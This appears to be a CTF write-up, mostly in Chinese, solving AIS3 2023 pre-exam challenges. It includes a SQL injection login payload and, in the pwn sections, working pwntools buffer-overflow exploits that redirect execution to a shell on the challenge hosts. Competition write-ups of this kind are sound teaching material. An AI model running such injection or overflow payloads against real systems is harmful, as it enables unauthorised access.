# AIS32023 pre-exam write-up

# Misc


## Welcome


- **AIS3{WELCOME-TO-2023-PRE-EXAM-&-MY-FIRST-CTF}**

## robot


### Information

Are you a robot?

Note: This is NOT a reversing or pwn challenge. Don't reverse the binary. It is for local testing only. You will actually get the flag after answering all the questions. You can practice locally by running ./robot AIS3{fake_flag} 127.0.0.1 1234 and it will run the service on localhost:1234.

Author: toxicpie

nc chals1.ais3.org 12348

### Solution

僅須根據輸出的運算式進行運算輸入結果即可，這邊提供兩種解法。

- 手動，如果速度夠快沒問題。
- 自動，使用腳本，其中使用 [正則表達式] 抓 數字與操作。

### flag.py

```python
from pwn import *
import re

context.log_level = 'DEBUG'

def main():
    p = remote(host='chals1.ais3.org', port=12348)

    info(p.recvuntil(b'Timeout is 90 seconds\n'))
    info(p.recvuntil(b"Answer 30 easy math questions to get the flag. Let's go!\n"))

    while True:
        try:
            line = p.recvuntil(b'\n').decode().strip()
            info(line)

            int_list = re.findall(r'\d+', line)
            op_list = re.findall(r'[\+\-\*\/]', line)
            print(int_list, ' ',op_list)

            if '+' in op_list:
                res = int(int_list[0]) + int(int_list[1])
            elif '-' in op_list:
                res = int(int_list[0]) - int(int_list[1])
            elif '*' in op_list:
                res = int(int_list[0]) * int(int_list[1])
            elif '/' in op_list:
                res = int(int_list[0]) / int(int_list[1])
            else:
                info(line)
                print(p.recv())
                continue
            p.sendline(str(res).encode())

        except:
            pass

if __name__=='__main__':
    main()
```

# Crypto


## Fernet


### Information

- `MyFirstCTF` `Baby`

你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。你需要解開被加密的檔案，否則事情就大條了！

### Solution

題目當中提供了 **chal.py**、**output.txt** 兩個檔案，透過觀察可以合理推斷 **output.txt** 是透過 **chal.py** 進行加密，所以要得到原文 (plain text)，必須先了解如何解密。

- [Fernet](https://file+.vscode-resource.vscode-cdn.net/d%3A/All_In_One/Learning/CTF/CTF-write-ups/AIS32023/write-up/Fernet/README.md): 是一種對稱式加密演算法，使用 AES 和 [HMAC](https://zh.wikipedia.org/zh-tw/HMAC) 摘要算法來實現對稱加密。
    1. 使用 key 生成 AES、HMAC。
    2. 將 plaintext 作為參數傳遞給 AES，使用 CBC 模式進行加密。
    3. 將 AES 加密後的 key 和 隨機生成的初始化向量（IV）拼接在一起，形成 ciphertext。
    4. 將 ciphertext 作為參數傳給 HMAC ，計算出 ciphertext 的 HMAC 值。
    5. 將 HMAC 值和 ciphertext 進行拼接，形成最終的 ciphertext。

### Encrypt

加密過程為以下

- Encrypt
    
    ```python
    def encrypt(plaintext, password):
         salt = os.urandom(16)  
         key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)  
         f = Fernet(base64.urlsafe_b64encode(key))  
         ciphertext = f.encrypt(plaintext.encode())  
         return base64.b64encode(salt + ciphertext).decode()
    
    # Usage:
    leak_password = 'mysecretpassword'
    plaintext = FLAG
    
    # Encrypt
    ciphertext = encrypt(plaintext, leak_password)
    print("Encrypted data:",ciphertext)
    ```
    
- Step
    1. salt: 使用 `os.urandom(16)` 產生一個長度為 16 Bytes 的隨機值，作為 `salt`。
        
        ```python
        salt = os.urandom(16)
        ```
        
    2. key: 使用 `PBKDF2` 產生 key，根據一個 salt 、password 生成一個固定長度的 key，其中 `hmac_hash_module` 是指使用 `HMAC`=SHA256。
        
        ```python
        key = PBKDF2(password.encode(), salt, size=32, count=1000, hmac_hash_module=SHA256)
        ```
        
    3. 使用 [base64.urlsafe_b64encode(key)](https://docs.python.org/3/library/base64.html#base64.urlsafe_b64encode) 函數將 key 轉換("+"->"-"、"/"->"_"、"=="->"=")，並用 `Fernet`進行初始化。
        
        ```python
        f = Fernet(base64.urlsafe_b64encode(key))
        ```
        
    4. 使用 `f.encrypt()` 將 plaintext 進行加密。
        
        ```
        ciphertext = f.encrypt(plaintext.encode())
        ```
        
    5. 最後回傳 ciphertext。
- output.txt
    
    ```
    Encrypted data: iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj
    ```
    

### Decrypt

- 發現其中有可以使用的資訊。
    
    ```python
    leak_password = 'mysecretpassword'
    plaintext = FLAG // not real flag
    ```
    
- 逆推回去進行解密操作。
- Step
    1. 對 ciphertext 進行 b64decode()，分為 `salt` 與 `ciphertext`。
        - 在 [encrypt](https://cryptography.io/en/latest/fernet/#cryptography.fernet.Fernet.encrypt) 函數中，將 salt 和 ciphertext 進行了拼接，並將其 base64 加密。
    2. 透過 `PBKDF2` 生成原先加密的 key。
        - 因為已經得知 password、salt，所以可以得到加密時使用的 key 。
    3. 透過 `base64.urlsafe_b64encode(key)` 將 key 轉為 base64，並用 `Fernet`進行初始化。
        - 因為已經的到 key，所以可以得到原先加密時所使用的 `Fernet`。
    4. 使用 `f.decrypt()` 進行解密。

```python
def decrypt(ciphertext, password):
    ciphertext = base64.b64decode(ciphertext.encode())
    salt, ciphertext = ciphertext[:16], ciphertext[16:]
    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
    f = Fernet(base64.urlsafe_b64encode(key))
    plaintext = f.decrypt(ciphertext).decode()
    return plaintext
```

### flag.py

```python
import base64
from cryptography.fernet import Fernet
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import PBKDF2

def decrypt(ciphertext, password):
    ciphertext = base64.b64decode(ciphertext.encode())
    salt, ciphertext = ciphertext[:16], ciphertext[16:]
    key = PBKDF2(password.encode(), salt, 32, count=1000, hmac_hash_module=SHA256)
    f = Fernet(base64.urlsafe_b64encode(key))
    plaintext = f.decrypt(ciphertext).decode()
    return plaintext

def main():
    leak_password = 'mysecretpassword'
    ciphertext = 'iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlOaC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1JaOGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj'

    plaintext = decrypt(ciphertext, leak_password)
    print(plaintext)

if __name__=='__main__':
    main()
```

# Web


## Loing Panel


### Information

- `MyFirstCTF`、`Easy`

Login Panel 網站採用了隱形 reCAPTCHA 作為防護機制，以確保只有人類的使用者能夠登入 admin 的帳號。你的任務是找到一個方法來繞過 reCAPTCHA，成功登入 admin 的帳號。

你可以使用各種技術和手段來達成目標，可能需要進行一些網站分析、程式碼解讀或其他形式的攻擊。請注意，你需要遵守道德規範，不得進行任何非法或有害的行為。

當你成功登入 admin 的帳號後，你將能夠獲得 FLAG。請將 FLAG 提交至挑戰平台，以證明你的成功。

Author: Ching367436

### Solution

題目提供 src 跟 config 可以看，透過其中內容推敲即可。 首先一開始進入會看到一個 Login 頁面，明顯是要考驗 SQL Injection 的能力，而且還是個裸體的 SQL Injection。

- Login 頁面存在 SQL Injection 漏洞。
    - Username: `admin`
    - Password: `' OR 1=1--`
- 若失敗會導入至其他頁面...XD

登入後，會發現存在 2fa 雙因子認證頁面，但明顯是我們是得不到其中的 code，實則是要你自行重定向至其他頁面。

- 其中透過給予的 src，可以發現存在一個 `dashboard` 頁面可以使用，當使用 `admin` 權限訪問即可得到 flag。

# Reverse


## Simply Reverse


### Information

- `MyFirstCTF` `Baby`
- `Reverse`

Just reverse it!

### Solution

題目提供一個壓縮檔，其中內容只包含一個 ELF 格式 64bits 的 binary 檔，透過 IDA Pro 或 Ghidra 等工具反組譯、反編譯一下。

觀察其中內容，可以發現存在一個 `verify(_int64 a1)` 的 function，之後程式的運行將因為騎回傳的結果繼續，若為 True 則正確並輸出 "Correct key!"，反之則失敗並輸出 "Wrong key!"。

觀察 `verify(_int64 a1)` 內容。

- IDA Pro 一下
    
    ```c
    _BOOL8 __fastcall verify(__int64 a1)
    {
    int i;// [rsp+14h] [rbp-4h]for ( i = 0; *(_BYTE *)(i + a1); ++i )
    {
        if ( encrypted[i] != ((unsigned __int8)((i ^ *(unsigned __int8 *)(i + a1)) << ((i ^ 9) & 3)) | (unsigned __int8)((i ^ *(unsigned __int8 *)(i + a1)) >> (8 - ((i ^ 9) & 3))))
                        + 8 )
        return 0LL;
    }
    return i == 34;
    }
    
    ```
    

解密只需要根據其邏輯進行反推。

- Decrypt: 對 data[i]-8，再 << (i^9)&3，再來 >> 8-((i-9)&3)，最後+8，其中要注意 &0xff 抓取一個 byte 大小，才不會超過 range。
    
    ```python
    encrypted = [0x8A, 0x50, 0x92, 0xC8, 0x06, 0x3D, 0x5B, 0x95, 0xB6, 0x52, 0x1B,
            0x35, 0x82, 0x5A, 0xEA, 0xF8, 0x94, 0x28, 0x72, 0xDD, 0xD4, 0x5D,
            0xE3, 0x29, 0xBA, 0x58, 0x52, 0xA8, 0x64, 0x35, 0x81, 0xAC, 0x0A,
            0x64]
    
    def Decrypt(data):
        decrypted = ""
        for i in range(len(data)):
            byte = (data[i] - 8 )&0xff
            byte = (((byte >> ((i ^ 9) & 3)) | (byte << (8 - ((i ^ 9) & 3))))&0xff)^i
            decrypted += chr(byte)
        return decrypted
    
    def main():
        print(Decrypt(encrypted))
    
    if __name__=='__main__':
        main()
    
    ```
    

## flag-sleeper


### Information

- `Hello World 🌱` `Easy` `MyFirstCTF`

Taking a nap before entering the world of AIS3 is important! A good hacker requires good sleep, and so does this flag checker.

Author: TwinkleStar03 ✨

### Solution

題目中提供一個壓縮檔，其中內容僅包含一個 ELF 64bits 的 binary 檔。

透過反組譯、反編譯工具對 binary 內容進行查看。

- IDA Pro 一下
    
    ```c
    v4 = time(0LL);
    srand(v4 + 3158064);
    while ( v5 != 52 )
    {
      v6 = rand() % 52;
      v7 = v8[v6];
      if ( a2[1][v7] != (v10[v6] ^ v9[v6]) )
      {
        puts(&s);
        return 1LL;
      }
      if ( !v11[v7] )
        ++v5;
      ++v11[v7];
      sleep(1u);
    }
    puts(&byte_2041);
    return 0LL;
    }
    else
    {
        puts(&s);
        return 1LL;
    }
    ```
    

透過內容可以看出其結果會是 argv[1] 與前方已經定義的 v8, v9, v10 進行操作比對。 - 操作如下 `c v6 = rand() % 52; v7 = v8[v6]; if ( a2[1][v7] != (v10[v6] ^ v9[v6]) ) ...`

- 綜上所知，可以得到以下內容。
    - v8 被當作 index。
    - v9, v10 是操作比對的目標對象。
    - 操作為 a2[1][v8[i]] = v9[i]^v10[i]，其中 i 為 rand()%52。
    - rand() 沒甚麼用處。

### fla.py

- 整理 v8, v9, v10，根據邏輯逆推。

```python
v8 = [10, 12, 28, 7, 38, 31, 47, 44, 42, 35, 48, 30, 21, 11, 17, 16, 34, 40, 33, 39, 41, 9, 22, 4, 6, 20, 19, 46, 23, 45, 26, 0, 15, 3, 8, 43, 14, 5, 2, 27, 49, 1, 51, 36, 37, 24, 25, 50, 32, 13, 29, 18]
v9 = [212, 232, 164, 28, 253, 132, 194, 47, 46, 150, 96, 216, 121, 216, 140, 164, 49, 219, 147, 252, 201, 28, 9, 188, 155, 79, 133, 255, 104, 20, 87, 64, 147, 143, 68, 147, 142, 96, 165, 244, 62, 58, 119, 25, 61, 56, 71, 182, 7, 37, 1, 154]
v10 = [237, 217, 212, 40, 149, 219, 165, 112, 29, 241, 8, 189, 13, 224, 211, 149, 5, 184, 255, 207, 162, 122, 86, 199, 170, 122, 240, 206, 9, 102, 102, 1, 163, 188, 119, 225, 239, 3, 246, 153, 9, 115, 10, 70, 94, 103, 52, 137, 97, 29, 109, 208]

flag = [None]*52

for i in range(52):
    flag[v8[i]] = chr(v9[i]^v10[i])

for i in flag:
    print(i, end='')
print()
```

# Pwn


## Simply Pwn


### Information

- `MyFirstCTF` `Baby`

The simplest pwn

### Solution

題目提供一個壓縮檔，其中包含一個 ELF 64bits 的 binary 檔。

- [Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)

透過反組譯、反編譯工具進行查看。

- IDA pro 一下
    - main
        
        可以發現 `read` 出現一個嚴重的 Stack-based Buffer Overflow。
        
        ```
        int __cdecl main(int argc, const char **argv, const char **envp)
        {
        __int64 v4;// [rsp+0h] [rbp-50h] BYREF
        __int64 v5[8];// [rsp+8h] [rbp-48h] BYREFint v6;// [rsp+4Ch] [rbp-4h]
        
        v4 = ',emocleW';
        v5[0] = 32LL;
        memset(&v5[1], 0, 48);
        write(1LL, "Show me your name: ", 19LL);
        v6 = read(0LL, (char *)v5 + 1, 256LL);
        if ( v6 > 0 )
            write(1LL, &v4, v6 + 9);
        return 0;
        }
        ```
        
        另外還有一個重點，function 結構中存在一個名為 shellcode 的 function。
        
        ```
        void __fastcall __noreturn shellcode(__int64 a1, __int64 a2, __int64 a3, int a4, int a5, int a6)
        {
        execl((unsigned int)"/bin/sh", (unsigned int)"/bin/sh", 0, a4, a5, a6);
        exit(0LL);
        }
        ```
        
- 根據上面資訊合理推測是要透過 `main` 的 Stack-based Buffer Overflow 將位址跳轉到 `shellcode`。
- offset 的部分則可以透過如 GDB 等的動態分析工具，對程式進行隨機輸入，並對行為進行觀察，從而找到 offset。
    - GEF: pattern create -> pattern search。
    - cyclic: 透過 `cyclic` 生成隨機字串，再透過記錄崩潰輸入的值，並使用 `cyclic -l` 反向尋找 offset。
- payload
    
    ```
    // offset = (8*8-1) + 8 + 8  # v5[0:8]-1 + v4 + rbp
    // shellcode_addresss = 0x04017AA
    payload = b'a'*71 + p64(0xdeadbeef) +  p64(shellcode_address)
    ```
    

### flag.py

```python
from pwn import *

# env setting
context(arch = 'amd64', os = 'linux')
#context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'

def connect():
  if True:
      return remote(host='chals1.ais3.org', port=11111)
  else:
      return process('./pwn')

def main():
  p = connect()

  # payload 
  shellcode_address = 0x04017AA 
  payload = b'a'*71 + p64(0xdeadbeef) + p64(shellcode_address)
  
  # send
  #gdb.attach(p)
  p.sendlineafter(b'Show me your name: ', payload)
  p.interactive()

if __name__=='__main__':
  main()
```

## ManagementSystem

### Information

- `MyFirstCTF` `Easy`
- `Pwn`

這個系統，看起來好像有點問題...。請利用你的技能和知識，找到漏洞並利用它們吧！

flag format : FLAG{xxx}

Author : Richard ( dogxxx)

### Solution

題目有提供 src，可以從其中進行 code review 觀察。

- src
    
    ```c
    ...
    void secret_function() {
    printf("Congratulations! You've successfully executed the secret function.\n");
    char *shell_args[] = {"/bin/sh", NULL};
    execv(shell_args[0], shell_args);
    }
    ...
    User *delete_user(User *head) {
    printf("Enter the index of the user you want to delete: ");
    char buffer[64];
    gets(buffer);
    ...
    ```
    

查看 src，可以發現 `delete_user` 中存在一個 `gets()`，代表這個地方肯定很好用，並且會發現一個很好的跳轉點。

- 為了能觸發 `gets()` ，需要先將前面的資訊輸入完成，才能觸發這裡。
    
    ```
    Choose an option:
    1. Add user
    2. Show users
    3. Delete user
    4. Exit
    >
    ```
    
- gdb 後抓 offset 為多少。
    - offset=12*8+8
- 因為 PIE 沒開，所以可以找出 `secret_function` 的位址為多少。
    - secret_function_address = 0x000000000040131b
- payload
    
    ```python
    # payload 1 (add user)
    p.sendlineafter(b'> ', '1')
    p.sendlineafter(b'Enter username (max 31 characters):', b'a')
    p.sendlineafter(b'Enter user account (max 15 characters):', b'a')
    p.sendlineafter(b'Enter user password (max 15 characters):', b'a')
    
    #gdb.attach(p)# payload 2 (crack gets)
    p.sendlineafter(b'> ', '3')
    p.sendlineafter(b'Enter the index of the user you want to delete:', b'a'*8*13+p64(secret_function_address))
    ```
    

### flag.py

```python
#!/usr/bin/env python3
from pwn import *

# env setting
context(arch = 'amd64', os = 'linux')
#context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = 'DEBUG'

def connect():
    if True:
        return remote('chals1.ais3.org', port=10003)
    else:
        return process('./ms')

def main():
    p = connect()

    secret_function_address = 0x000000000040131b
    
    # payload 1 (add user)
    p.sendlineafter(b'> ', '1')
    p.sendlineafter(b'Enter username (max 31 characters):', b'a')
    p.sendlineafter(b'Enter user account (max 15 characters):', b'a')
    p.sendlineafter(b'Enter user password (max 15 characters):', b'a')
    
    #gdb.attach(p)
    
    # payload 2 (crack gets)
    p.sendlineafter(b'> ', '3')
    p.sendlineafter(b'Enter the index of the user you want to delete:', b'a'*8*13+p64(secret_function_address))

    p.interactive()

if __name__=='__main__':
    main()
```
